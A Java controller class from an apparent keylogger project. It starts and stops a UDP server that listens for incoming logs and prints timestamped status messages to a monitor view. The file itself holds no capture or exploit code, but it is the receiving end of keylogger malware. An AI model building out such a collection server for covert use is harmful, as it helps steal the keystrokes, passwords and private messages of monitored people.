package com.hao.keylogger.controllers.server;

import java.text.SimpleDateFormat;
import java.util.Date;

import com.hao.keylogger.models.Log;
import com.hao.keylogger.views.ServerView;

public class ServerLogController {
	ServerView view;
	Log log;
	UDPServerHelper udpServerHelper;
	private final int DEFAULT_PORT = 17;
	
	public ServerLogController(ServerView view, Log log) {
		this.view = view;
		this.log = log;
		view.setController(this);
		view.setHost(UDPServerHelper.getLocalHostIP());
		view.setPort(DEFAULT_PORT);
	}

	public boolean startServer() {
		String hostName = view.getHost();
		int port = view.getPort();
		// init
		udpServerHelper = UDPServerHelper.getInstance(hostName, port);
		udpServerHelper.setController(this);
		
		if (udpServerHelper.startServer()) {
			appendToMonitory("Server started at " + hostName + ":" + port);
			startListenning();
			return true;
		}
		return false;
	}
	
	public boolean stopServer() {
		if (udpServerHelper.stopServer()) {
			appendToMonitory("Server stopped.");
			return true;
		}
		return false;
	}

	public void appendToMonitory(String msg) {
		view.appendToMonitor(new SimpleDateFormat("dd/MM/yyyy hh:mm:ss").format(new Date()));
		view.appendToMonitor(": ");
		view.appendToMonitor(msg);
		view.appendToMonitor("\n");
		
	}

	private void startListenning() {
		udpServerHelper.startListenning();
	}


}
